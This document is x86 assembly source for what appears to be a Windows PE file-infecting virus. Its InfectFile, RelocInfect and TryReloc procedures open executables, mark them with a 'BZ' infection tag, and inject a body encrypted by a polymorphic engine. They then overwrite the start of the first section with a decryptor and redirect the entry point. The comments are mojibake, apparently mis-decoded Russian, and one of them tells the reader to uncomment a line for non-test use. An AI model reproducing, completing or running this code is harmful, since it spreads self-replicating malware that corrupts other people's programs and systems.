   InfectFile      proc

       push    edx
       mov edi,edx
       Call    CheckName
       pop edx
       jb  nextone

       push    edx
       Call    [GetFileAttributes][ebp],edx
       mov [fattr][ebp],eax
       pop edx

   ; Uncomment for *NOT* test purposes :)
   ;   Call    [SetFileAttributes][ebp],edx,80h

       lea edx,[cFileName][ebp]        ; Žâªà®¥¬
       Call    [CreateFile][ebp],edx,GENERIC_READ or GENERIC_WRITE,SHARE_READ,0,OPEN_EXISTING,0,0
       inc eax             ; *¨§§ï ?
       jz  nextone
       dec eax
       xchg    eax,ebx
       lea edx,[need][ebp]         ; —¨â ¥¬ header
       lea ecx,[free][ebp]
       Call    [ReadFile][ebp],ebx,edx,40h,ecx,0
       mov ax,'ZM'
       cmp 2 ptr [need][ebp],ax
       jnz CloseIt
       mov eax,'ZB'            ; BZ ¥áâì ?
       cmp 2 ptr [need][12h][ebp],ax
       jz  CloseIt             ; …áâì...¨ ç¥ § ¯¨è¥¬ 'BZ'
       mov 2 ptr [need][12h][ebp],ax   ; ’®¥áâì ¥á«¨ ¬ë ¥£® á¥©ç á
       Call    [FSeek][ebp],ebx,0,0,0      ; ¥ § à §¨¬ - ¤ «ìè¥ ¨ ¯ëâ âáï
       lea edx,[need][ebp]         ; ¥ ¡ã¤¥¬,  ¬¥âªã § à ¦¥¨ï
       lea ecx,[free][ebp]         ; ®áâ ¢¨¬. *ª®®¬¨ï ¢à¥¬¥¨
       Call    [WriteFile][ebp],ebx,edx,40h,ecx,0

       mov eax,4 ptr [need][3Ch][ebp]
       mov [peh][ebp],eax
       Call    [FSeek][ebp],ebx,eax,0,0    ;   PE § £®«®¢®ª
       lea edx,[need][ebp]
       push    edx
       lea ecx,[free][ebp]
       Call    [ReadFile][ebp],ebx,edx,0F8h,ecx,0  ; —¨â ¥¬
       pop edi
       mov eax,'EP'            ; PE ?
       scasd
       jnz CloseIt

       Call    [FSeek][ebp],ebx,0,0,1      ; *®«ãç¨¬ ¯®§¨æ¨î
       mov [fsec][ebp],eax

       movzx   eax,2 ptr [need][6][ebp]
           xor     ecx,ecx                         ; —¨â ¥¬ á¥ªæ¨¨
           mov     edx,28h
           mul     edx
       mov [mpos][ebp],eax

       lea edx,[sects][ebp]
       lea ecx,[free][ebp]
       Call    [ReadFile][ebp],ebx,edx,eax,ecx,0

       Call    [FSeek][ebp],ebx,4 ptr [sects][ebp][14h],0,0
                           ; *  ¥¥ physical offset

       mov eax,xVic
       cmp 4 ptr [sects][ebp][10h],eax ; € ®  ¥ ¬¥ìè¥ ç¥¬ ã® ?
       jbe CloseIt             ; Œ¥ìè¥,ã ¥¥

       mov [rinf][ebp],0

       lea edx,[old5][ebp]
       lea ecx,[free][ebp]         ; —¨â ¥¬ 2 ª¨«®
       Call    [ReadFile][ebp],ebx,edx,eax,ecx,0

       mov eax,4 ptr [sects][ebp][0Ch] ; …¥ RVA
       add eax,4 ptr [need][ebp][34h]  ; + ImageBase = VA
       mov 4 ptr [oldpos][ebp],eax     ; ‘®åà ¨«¨

       or  4 ptr [sects][ebp][24h],80000000h   ; +Write

       movzx   ecx,2 ptr [need][6][ebp]    ; *à®¯ãáª ¥¬ á¥ªæ¨¨
       xor edi,edi
           lea     esi,[sects][ebp]
       mov edx,4 ptr [need][80h][ebp]
   LoadSect:
       mov eax,4 ptr [esi][08h]    ; …¥ RVA
       add eax,4 ptr [esi][0Ch]    ; + à §¬¥à
       cmp eax,edi
       jbe smaller
       mov edi,eax             ; *®ª  á ¬®¥ ¡®«ìè®¥
   smaller:
   ;-----------
       cmp edx,4 ptr [esi][0Ch]
       jb  notimport
       cmp edx,eax
       ja  notimport
   ;-----------
       or  4 ptr [esi][24h],80000000h      ; +Write
   notimport:
           cmp     4 ptr [need][0A0h][ebp],eax
           jae notreloc
           mov eax,4 ptr [esi][0Ch]
           cmp 4 ptr [need][0A0h][ebp],eax
           jb  notreloc
       Call    TryReloc
   notreloc:
           add     esi,28h
       loop    LoadSect

   all:    cmp [rinf][ebp],1
       jz  RelocInfect

       mov eax,[mpos][ebp]
       add eax,[fsec][ebp]
       add eax,28h
       mov ecx,10h
       lea esi,[need][78h][ebp]        ; € ¬ë ¨ç¥£® ¥ § âà¥¬,¥á«¨
       mov edx,4 ptr [sects][ebp][0Ch]
       add edx,xVic
   Checkit:cmp 4 ptr [esi],0           ; ¤®¡ ¢¨¬ á¥ªæ¨î ?
       jz  undefined
       cmp 4 ptr [esi],eax
       jbe CloseIt
       cmp 4 ptr [esi],edx         ; € ¨ª ª ï ä¨£ï ¥ § âà¥â
       jbe CloseIt             ;  è ¤¥ªà¨¯â®à ?
   undefined:
       add esi,8
       loop    Checkit

       Call    [FSeek][ebp],ebx,0,0,2      ; ¢ ª®¥æ

       mov ecx,4 ptr [need][ebp][3Ch]  ; File Padding á®¡«î¤ ¥âáï ?
       xor edx,edx
       div ecx
       or  edx,edx
       jz  NoPad               ; “£ã
       sub ecx,edx
       lea edx,[main][ebp]
       lea eax,[free][ebp]         ; *à¨¤¥âáï ¬ãá®à®¬ § ¡¨âì
       Call    [WriteFile][ebp],ebx,edx,ecx,eax,0
   NoPad:  Call    [FSeek][ebp],ebx,0,0,2      ; ‚ ª®¥æ ä ©« 
       mov [ipos][ebp],eax         ; ‘®åà ¨¬ ¯®§¨æ¨î

       mov eax,edi             ; * è ®¢ë© RVA
       mov ecx,4 ptr [need][38h][ebp]
       xor edx,edx
       div ecx
       or  edx,edx             ; *¥  ¤® ¯®¤¯à ¢«ïâì ?
       jz  skipit
       sub ecx,edx
       jmp ww
   skipit: xor ecx,ecx
   ww: add ecx,edi
       mov [irva][ebp],ecx         ; RVA  è¥© á¥ªæ¨¨

       mov eax,4 ptr [need][28h][ebp]  ; Old EntryPoint RVA
       add eax,4 ptr [need][34h][ebp]  ; + ImageBase = VA
       mov 4 ptr [oldh][ebp],eax

       mov 4 ptr [need][58h][ebp],0    ; CheckSum

       inc 4 ptr [need][6][ebp]

       push    ecx
       mov ecx,4 ptr [need][38h][ebp]  ; * è à §¬¥à. *à®¯ âç¨¬ ¥£®
       mov eax,fvlen           ;   object align
       xor edx,edx
       div ecx
       sub ecx,edx
       add ecx,fvlen
       add 4 ptr [need][1Ch][ebp],ecx  ; +Code Size
       add 4 ptr [need][50h][ebp],ecx  ; +Image Size
       mov 4 ptr [mysze][ebp],ecx      ; Virtual Size of our section
       pop ecx

       lea esi,[main][ebp]
       lea edi,[body][ebp]
       mov edx,ecx
       add edx,4 ptr [need][34h][ebp]
       mov ecx,vlen
       push    ebx             ; ˜¨äàã¥¬áï
       mov ebx,4 ptr [need][34h][ebp]
       add ebx,4 ptr [sects][ebp][0Ch]
       Call    wsmm                ; Polymorphic engine
       pop ebx
       cmp eax,xVic
       ja  CloseIt
       mov [dclen][ebp],eax        ; * §¬¥à à áè¨äà®¢é¨ª 
       mov [ecbody][ebp],edx       ; ‘¬¥é¥¨¥   § è¨äà®¢ ë© ª®¤

       mov eax,[cVir][ebp]
       mov ecx,4 ptr [need][38h][ebp]
       xor edx,edx
       div ecx         ; *à®¯ âç¨¬ à §¬¥à   object align
       sub ecx,edx
       add ecx,[cVir][ebp]
       mov [msize][ebp],ecx

       mov edx,[ecbody][ebp]
       lea eax,[free][ebp]
       call    [WriteFile][ebp],ebx,edx,ecx,eax,0  ; *¨è¨¬áï

           call    [FSeek][ebp],ebx,[fsec][ebp],0,0
           lea     edx,[sects][ebp]
           lea     eax,[free][ebp]
           Call    [WriteFile][ebp],ebx,edx,[mpos][ebp],eax,0

       lea edx,[mysec][ebp]            ; á¥ªæ¨¨
       lea eax,[free][ebp]
       call    [WriteFile][ebp],ebx,edx,28h,eax,0

       Call    [FSeek][ebp],ebx,4 ptr [sects][ebp][14h],0,0
                           ; *   ç «® ¯¥à¢®© á¥ªæ¨¨
       lea edi,[body][ebp]
       mov edx,[dclen][ebp]
       lea eax,[free][ebp]         ; *¨è¨¬ à áè¨äà®¢é¨ª
       Call    [WriteFile][ebp],ebx,edi,edx,eax,0

       mov eax,4 ptr [sects][ebp][0Ch] ; *®¢ë© EiP
       mov 4 ptr [need][ebp][28h],eax

       call    [FSeek][ebp],ebx,[peh][ebp],0,0     ; PE § £®«®¢®ª
       lea edx,[need][ebp]
       lea eax,[free][ebp]
       Call    [WriteFile][ebp],ebx,edx,0F8h,eax,0

   CloseIt:
       Call    [CloseHandle][ebp],ebx          ; ‡ ªàë¢ ¥¬
   nextone:
           ret
   InfectFile      endp

   RelocInfect     proc
       mov eax,4 ptr [need][28h][ebp]  ; Old EntryPoint RVA
       add eax,4 ptr [need][34h][ebp]  ; + ImageBase = VA
       mov 4 ptr [oldh][ebp],eax
       mov 4 ptr [need][58h][ebp],0    ; CheckSum

       mov esi,[rsec][ebp]
       mov ecx,4 ptr [esi][12]

       push    ecx
       mov ecx,4 ptr [need][38h][ebp]  ; * è à §¬¥à. *à®¯ âç¨¬ ¥£®
       mov eax,fvlen           ;   object align
       xor edx,edx
       div ecx
       sub ecx,edx
       add ecx,fvlen

       add 4 ptr [need][1Ch][ebp],ecx  ; +Code Size
       add 4 ptr [need][50h][ebp],ecx  ; +Image Size

       mov 4 ptr [esi][8],ecx      ; Virtual Size of our section
       pop ecx

       lea esi,[main][ebp]
       lea edi,[body][ebp]
       mov edx,ecx
       add edx,4 ptr [need][34h][ebp]
       mov ecx,vlen
       push    ebx             ; ˜¨äàã¥¬áï
       mov ebx,4 ptr [need][34h][ebp]
       add ebx,4 ptr [sects][ebp][0Ch]
       Call    wsmm                ; Polymorphic engine
       pop ebx
       cmp eax,xVic
       ja  CloseIt
       mov [dclen][ebp],eax        ; * §¬¥à à áè¨äà®¢é¨ª 
       mov [ecbody][ebp],edx       ; ‘¬¥é¥¨¥   § è¨äà®¢ ë© ª®¤

       mov eax,[cVir][ebp]
       mov ecx,4 ptr [need][38h][ebp]
       xor edx,edx
       div ecx         ; *à®¯ âç¨¬ à §¬¥à   object align
       sub ecx,edx
       add ecx,[cVir][ebp]

           mov     esi,[rsec][ebp]
       mov [esi][16],ecx

       push    ecx
       Call    [FSeek][ebp],ebx,4 ptr [esi][20],0,0
       pop ecx

       mov edx,[ecbody][ebp]
       lea eax,[free][ebp]
       call    [WriteFile][ebp],ebx,edx,ecx,eax,0  ; *¨è¨¬áï

           call    [FSeek][ebp],ebx,[fsec][ebp],0,0
           lea     edx,[sects][ebp]
           lea     eax,[free][ebp]
           Call    [WriteFile][ebp],ebx,edx,[mpos][ebp],eax,0

       Call    [FSeek][ebp],ebx,4 ptr [sects][ebp][14h],0,0
                           ; *   ç «® ¯¥à¢®© á¥ªæ¨¨
       lea edi,[body][ebp]
       mov edx,[dclen][ebp]
       lea eax,[free][ebp]         ; *¨è¨¬ à áè¨äà®¢é¨ª
       Call    [WriteFile][ebp],ebx,edi,edx,eax,0

       mov eax,4 ptr [sects][ebp][0Ch] ; *®¢ë© EiP
       mov 4 ptr [need][ebp][28h],eax

       call    [FSeek][ebp],ebx,[peh][ebp],0,0     ; PE § £®«®¢®ª
       lea edx,[need][ebp]
       lea eax,[free][ebp]
       Call    [WriteFile][ebp],ebx,edx,0F8h,eax,0


           jmp    CloseIt
   RelocInfect     endp


   TryReloc    proc
       push    ecx edx

       cmp ecx,1
       jnz CannotReloc

       cmp 4 ptr [need][34h][ebp],400000h
       jnz CannotReloc

       cmp 4 ptr [need][078h][ebp],0       ; Exports ?
       jnz CannotReloc

       push    4 ptr [need][0A0h][ebp]
       push    4 ptr [need][0A4h][ebp]

       xor eax,eax
       mov 4 ptr [need][0A0h][ebp],eax
       mov 4 ptr [need][0A4h][ebp],eax

       push    esi
       mov edx,4 ptr [esi][0Ch]
       mov eax,edx
       add edx,4 ptr [esi][08h]

       lea esi,[need][78h][ebp]
       mov ecx,10h
   Chckit: cmp 4 ptr [esi],0
       jz  OOOOPS
       cmp 4 ptr [esi],edx
       jae CloseIt3
       cmp 4 ptr [esi],eax
       jae CloseIt3
   OOOOPS:
       add esi,8
       loop    Chckit

           pop     esi eax eax
       mov [rsec][ebp],esi
       mov [rinf][ebp],1
       mov 4 ptr [esi][24h],80000000h or 40000000h or 20000000h or 40h
           jmp     CannotReloc
   CloseIt3:
           pop     esi
       pop 4 ptr [need][0A4h][ebp]
       pop 4 ptr [need][0A0h][ebp]
   CannotReloc:
       pop edx ecx
       ret
   TryReloc    endp

   rinf    db  ?
   rsec    dd  ?
